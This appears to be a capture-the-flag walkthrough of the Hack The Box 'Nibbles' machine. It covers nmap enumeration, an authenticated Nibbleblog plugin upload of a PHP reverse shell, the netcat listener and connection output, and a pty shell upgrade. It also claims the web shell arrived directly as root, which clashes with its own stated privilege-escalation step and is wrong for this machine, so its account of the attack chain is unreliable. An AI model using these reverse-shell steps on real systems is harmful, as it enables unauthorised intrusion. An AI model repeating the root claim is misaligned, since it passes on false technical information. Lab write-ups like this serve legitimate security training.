# HTB-nibbles

# 🧠 Nibbles – Penetration Test Walkthrough

---

## 📌 Overview

- **Target:** Linux Machine (Hack The Box)
- **Objective:** Gain root access
- **Methodology:** Enumeration → Exploitation → Privilege Escalation

---

## 🔍 1. Nmap Scan

Performed a full port scan to identify open services:

```
nmap -p- -sVC -T4 <target-ip>
```

**Findings:**
- Port 22 → SSH
- Port 80 → HTTP

![Nmap](nmap.png)

---

## 🌐 2. Web Enumeration

Visited the web server on port 80.

- Discovered a directory: `/nibbleblog`
- Identified CMS: **Nibbleblog**

This suggests a potential vulnerability in the CMS.

---

## 💥 3. Exploitation (File Upload → RCE)

Nibbleblog is vulnerable to authenticated file upload.

### Steps:
1. Logged into admin panel (using discovered/default credentials)
2. Navigated to plugin upload functionality
3. Uploaded a malicious PHP reverse shell

### Reverse shell triggered:

```
nc -lvnp 8443
```

Connection received:

```
connect to [ATTACKER-IP] from [TARGET-IP]
```

![Shell](shell.png)

---

## 🐚 4. Shell Access

Initial shell was obtained as root:

```
id
uid=0(root) gid=0(root)
```

However, shell is not fully interactive:

```
/bin/sh: can't access tty; job control turned off
```

👉 This indicates a basic reverse shell without TTY.

---

## 🚀 5. Shell Stabilization (Recommended)

Upgrade shell for better usability:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 👑 6. Root Access

Root access was already obtained via the exploited web application.

Verified:

```
whoami
root
```

---

## 🧠 Key Takeaways

- Always enumerate web directories (`/nibbleblog` was key)
- CMS platforms are common attack surfaces
- File upload functionality is a high-risk feature
- Reverse shells may need stabilization for full control
- Gaining RCE through web apps can sometimes lead directly to root

---

## 🔥 Attack Chain Summary

```
Web Server → Nibbleblog CMS → File Upload → RCE → Reverse Shell → Root
```

---
